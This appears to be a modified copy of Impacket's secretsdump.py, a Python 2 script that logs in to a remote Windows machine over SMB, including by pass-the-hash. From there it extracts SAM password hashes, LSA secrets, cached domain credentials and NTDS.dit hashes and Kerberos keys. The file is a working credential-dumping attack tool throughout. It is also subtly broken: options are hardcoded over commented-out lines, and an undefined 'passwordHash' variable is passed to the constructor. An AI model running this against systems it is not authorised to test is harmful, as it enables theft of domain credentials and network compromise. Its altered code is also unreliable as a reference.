#!/usr/bin/env python
# Copyright (c) 2003-2016 CORE Security Technologies
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description: Performs various techniques to dump hashes from the
#              remote machine without executing any agent there.
#              For SAM and LSA Secrets (including cached creds)
#              we try to read as much as we can from the registry
#              and then we save the hives in the target system
#              (%SYSTEMROOT%\\Temp dir) and read the rest of the
#              data from there.
#              For NTDS.dit we either:
#                a. Get the domain users list and get its hashes
#                   and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
#                   call, replicating just the attributes we need.
#                b. Extract NTDS.dit via vssadmin executed  with the
#                   smbexec approach.
#                   It's copied on the temp dir and parsed remotely.
#
#              The script initiates the services required for its working
#              if they are not available (e.g. Remote Registry, even if it is
#              disabled). After the work is done, things are restored to the
#              original state.
#
# Author:
#  Alberto Solino (@agsolino)
#
# References: Most of the work done by these guys. I just put all
#             the pieces together, plus some extra magic.
#
# https://github.com/gentilkiwi/kekeo/tree/master/dcsync
# http://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
# http://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
# http://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
# http://www.quarkslab.com/en-blog+read+13
# https://code.google.com/p/creddump/
# http://lab.mediaservice.net/code/cachedump.rb
# http://insecurety.net/?p=768
# http://www.beginningtoseethelight.org/ntsecurity/index.htm
# http://www.ntdsxtract.com/downloads/ActiveDirectoryOfflineHashDumpAndForensics.pdf
# http://www.passcape.com/index.php?section=blog&cmd=details&id=15
#
import argparse
import codecs
import logging
import os
import sys

from impacket import version
from impacket.examples import logger
from impacket.smbconnection import SMBConnection

from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes


class DumpSecrets:
    # def __init__(self, address, username='', password='', domain='', options=None):
    def __init__(self, address, username='', password='', passwordHash='', domain=''):

        #self.__useVSSMethod = options.use_vss
        self.__useVSSMethod = False
        self.__remoteAddr = address
        self.__username = username
        self.__password = password
        self.__domain = domain
        if passwordHash != None:
            self.__lmhash = passwordHash.split(':')[0]
        else:
            self.__lmhash = ''
        if passwordHash != None:
            self.__nthash = passwordHash.split(':')[1]
        else:
            self.__nthash = ''
        self.__aesKey = False
        #self.__aesKey = options.aesKey
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__systemHive = None
        #self.__systemHive = options.system
        self.__securityHive = None
        #self.__securityHive = options.security
        #self.__samHive = options.sam
        #self.__ntdsFile = options.ntds
        self.__samHive = None
        self.__ntdsFile = None
        #self.__history = options.history
        self.__history = False
        self.__noLMHash = True
        self.__isRemote = True
        #self.__outputFileName = options.outputfile
        self.__outputFileName = "secrets"
        self.__doKerberos = False
        #self.__doKerberos = options.k
        #self.__justDC = options.just_dc
        self.__justDC = False
        #self.__justDCNTLM = options.just_dc_ntlm
        self.__justDCNTLM = False
        #self.__justUser = options.just_dc_user
        self.__justUser = None
        #self.__pwdLastSet = options.pwd_last_set
        self.__pwdLastSet = False
        #self.__printUserStatus= options.user_status
        self.__printUserStatus = False
        #self.__resumeFileName = options.resumefile
        self.__resumeFileName = None
        self.__canProcessSAMLSA = True
        #self.__kdcHost = options.dc_ip
        self.__kdcHost = None
        self.__hashes = None

        if self.__hashes is not None:
            self.__lmhash, self.__nthash = self.__hashes.split(':')

        # if options.hashes is not None:
        #    self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        self.__smbConnection = SMBConnection(
            self.__remoteAddr, self.__remoteAddr)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(
                self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        try:
            if self.__remoteAddr.upper() == 'LOCAL' and self.__username == '':
                self.__isRemote = False
                self.__useVSSMethod = True
                localOperations = LocalOperations(self.__systemHive)
                bootKey = localOperations.getBootKey()
                if self.__ntdsFile is not None:
                    # Let's grab target's configuration about LM Hashes storage
                    self.__noLMHash = localOperations.checkNoLMHashPolicy()
            else:
                self.__isRemote = True
                bootKey = None
                try:
                    try:
                        self.connect()
                    except:
                        if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            logging.debug(
                                'SMBConnection didn\'t work, hoping Kerberos will help')
                            pass
                        else:
                            raise

                    self.__remoteOps = RemoteOperations(
                        self.__smbConnection, self.__doKerberos, self.__kdcHost)
                    if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
                        self.__remoteOps.enableRegistry()
                        bootKey = self.__remoteOps.getBootKey()
                        # Let's check whether target system stores LM Hashes
                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
                except Exception, e:
                    self.__canProcessSAMLSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                            and self.__doKerberos is True:
                        # Giving some hints here when SPN target name validation is set to something different to Off
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                        logging.error(
                            'Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                    else:
                        logging.error('RemoteOperations failed: %s' % str(e))

            # If RemoteOperations succeeded, then we can extract SAM and LSA
            if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
                try:
                    if self.__isRemote is True:
                        SAMFileName = self.__remoteOps.saveSAM()
                    else:
                        SAMFileName = self.__samHive

                    self.__SAMHashes = SAMHashes(
                        SAMFileName, bootKey, isRemote=self.__isRemote)
                    self.__SAMHashes.dump()
                    if self.__outputFileName is not None:
                        self.__SAMHashes.export(self.__outputFileName)
                except Exception, e:
                    logging.error('SAM hashes extraction failed: %s' % str(e))

                try:
                    if self.__isRemote is True:
                        SECURITYFileName = self.__remoteOps.saveSECURITY()
                    else:
                        SECURITYFileName = self.__securityHive

                    self.__LSASecrets = LSASecrets(
                        SECURITYFileName, bootKey, self.__remoteOps, isRemote=self.__isRemote)
                    self.__LSASecrets.dumpCachedHashes()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportCached(self.__outputFileName)
                    self.__LSASecrets.dumpSecrets()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportSecrets(self.__outputFileName)
                except Exception, e:
                    logging.error('LSA hashes extraction failed: %s' % str(e))

            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
            if self.__isRemote is True:
                if self.__useVSSMethod and self.__remoteOps is not None:
                    NTDSFileName = self.__remoteOps.saveNTDS()
                else:
                    NTDSFileName = None
            else:
                NTDSFileName = self.__ntdsFile

            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                           useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                           pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                           outputFileName=self.__outputFileName, justUser=self.__justUser,
                                           printUserStatus=self.__printUserStatus)
            try:
                self.__NTDSHashes.dump()
            except Exception, e:
                if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                    resumeFile = self.__NTDSHashes.getResumeSessionFile()
                    if resumeFile is not None:
                        os.unlink(resumeFile)
                logging.error(e)
                if self.__useVSSMethod is False:
                    logging.info(
                        'Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
            self.cleanup()
        except (Exception, KeyboardInterrupt), e:
            #import traceback
            # print traceback.print_exc()
            logging.error(e)
            if self.__NTDSHashes is not None:
                if isinstance(e, KeyboardInterrupt):
                    while True:
                        answer = raw_input(
                            "Delete resume session file? [y/N] ")
                        if answer.upper() == '':
                            answer = 'N'
                            break
                        elif answer.upper() == 'Y':
                            answer = 'Y'
                            break
                        elif answer.upper() == 'N':
                            answer = 'N'
                            break
                    if answer == 'Y':
                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
            try:
                self.cleanup()
            except:
                pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()


# Process command-line arguments.
if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    print version.BANNER

    parser = argparse.ArgumentParser(add_help=True, description="Performs various techniques to dump secrets from "
                                     "the remote machine without executing any agent there.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                       ' (if you want to parse local files)')
    parser.add_argument('-debug', action='store_true',
                        help='Turn DEBUG output ON')
    parser.add_argument('-system', action='store', help='SYSTEM hive to parse')
    parser.add_argument('-security', action='store',
                        help='SECURITY hive to parse')
    parser.add_argument('-sam', action='store', help='SAM hive to parse')
    parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
    parser.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                        'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                        'state')
    parser.add_argument('-outputfile', action='store',
                        help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
    parser.add_argument('-use-vss', action='store_true', default=False,
                        help='Use the VSS method insead of default DRSUAPI')
    group = parser.add_argument_group('display options')
    group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                       help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                            'Implies also -just-dc switch')
    group.add_argument('-just-dc', action='store_true', default=False,
                       help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
    group.add_argument('-just-dc-ntlm', action='store_true', default=False,
                       help='Extract only NTDS.DIT data (NTLM hashes only)')
    group.add_argument('-pwd-last-set', action='store_true', default=False,
                       help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
    group.add_argument('-user-status', action='store_true', default=False,
                       help='Display whether or not the user is disabled')
    group.add_argument('-history', action='store_true',
                       help='Dump password history')
    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH",
                       help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true",
                       help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                       ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication'
                       ' (128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re

    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')

    # In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if options.just_dc_user is not None:
        if options.use_vss is True:
            logging.error('-just-dc-user switch is not supported in VSS mode')
            sys.exit(1)
        elif options.resumefile is not None:
            logging.error(
                'resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch')
            sys.exit(1)
        elif address.upper() == 'LOCAL' and username == '':
            logging.error('-just-dc-user not compatible in LOCAL mode')
            sys.exit(1)
        else:
            # Having this switch on implies not asking for anything else.
            options.just_dc = True

    if options.use_vss is True and options.resumefile is not None:
        logging.error(
            'resuming a previous NTDS.DIT dump session is not supported in VSS mode')
        sys.exit(1)

    if address.upper() == 'LOCAL' and username == '' and options.resumefile is not None:
        logging.error(
            'resuming a previous NTDS.DIT dump session is not supported in LOCAL mode')
        sys.exit(1)

    if address.upper() == 'LOCAL' and username == '':
        if options.system is None:
            logging.error(
                'SYSTEM hive is always required for local parsing, check help')
            sys.exit(1)
    else:

        if domain is None:
            domain = ''

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True
    #dumper = DumpSecrets(address, username, password, domain, options)
    dumper = DumpSecrets(address, username, password, passwordHash, domain)
    try:
        dumper.dump()
    except Exception, e:
        logging.error(e)
